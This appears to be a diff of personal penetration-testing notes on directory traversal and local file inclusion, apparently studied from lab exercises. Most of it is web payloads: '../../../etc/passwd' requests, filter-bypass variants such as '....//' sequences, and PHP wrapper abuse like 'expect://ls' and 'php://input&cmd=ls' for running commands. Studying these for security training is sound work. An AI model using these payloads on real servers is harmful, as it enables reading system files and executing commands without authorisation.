@@ -1,10 +1,24 @@
+**Directory Traversal**
+  Only give us ability to read the resources from the target. 
+
 ```
+https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
+
+LFI 
+  Load and Execute the application 
 Image file LFI
 GET /image?filename=31.jpg
 GET /image?filename=../../../etc/passwd
 
-/script.php?page=index.html
-/script.php?page=../../../../../../../../etc/passwd
+File path traversal, traversal sequences blocked with absolute path bypass
+/etc/passwd
+
+File path traversal, traversal sequences stripped non-recursively
+....//....//....//etc/passwd
+
+File path traversal, traversal sequences stripped with superfluous URL-decode
+
+
 
 PHP Wrappers
 PHP has a number of wrappers that can often be abused to bypass various input filters.
@@ -15,4 +29,6 @@ php?page=expect://ls
 The payload is sent in a POST request to the server such as:
 /fi/?page=php://input&cmd=ls
 
+/script.php?page=index.html
+/script.php?page=../../../../../../../../etc/passwd
 ```
